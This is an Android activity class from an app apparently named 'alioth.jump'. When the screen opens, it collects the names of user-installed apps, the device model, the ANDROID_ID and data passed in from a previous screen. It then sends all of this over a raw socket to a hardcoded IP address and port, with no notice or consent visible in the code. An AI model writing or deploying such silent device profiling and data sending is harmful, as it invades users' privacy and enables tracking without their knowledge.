package com.example.alioth.jump;

import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.widget.TextView;

import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NinethActivity extends AppCompatActivity {
    //private TextView test;
    private String data;
    private String AppNames;
    private String DeviceID;
    private Socket socket;
    private ExecutorService mTreadPool;
    private static final String TAG = "NinethActivity";
    private static final String serverip = "140.143.226.206";
    private static final int port = 10081;
    private String model;
    OutputStream outputStream;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_nineth);
        mTreadPool = Executors.newCachedThreadPool();
        //test = (TextView)findViewById(R.id.test);
        Intent intent = getIntent();
        data = intent.getStringExtra("extradata");
        //test.setText(data);
        model= Build.MODEL;
        send(data);
    }
    protected void send(final String data){
        final List appList = new ArrayList();
        List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
        for(int i=0;i<packages.size();i++){
            PackageInfo packageInfo = packages.get(i);
            String appname = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
            if((packageInfo.applicationInfo.flags& ApplicationInfo.FLAG_SYSTEM)==0){
                appList.add(appname);
            }
        }
        AppNames = TextUtils.join(",",appList);
        DeviceID = Settings.System.getString(getContentResolver(), Settings.System.ANDROID_ID);
        //test.setText(AppNames);
        mTreadPool.execute(new Runnable() {
            @Override
            public void run() {
                try{
                    InetAddress serverAddr = InetAddress.getByName(serverip);
                    socket = new Socket(serverAddr,port);
                    PrintWriter out = new PrintWriter(new BufferedWriter(
                            new OutputStreamWriter(socket.getOutputStream())),true);
                    Log.d(TAG,"To server:"+AppNames);
                    out.println(AppNames+" "+data+" "+model);
                    out.println(DeviceID);
                    out.flush();
                }catch (UnknownHostException e){
                    Log.e(TAG,"server ip is incorrect!");
                }catch (Exception e){
                    e.printStackTrace();
                }finally{
                    try{
                        socket.close();
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }
        });
    }
}
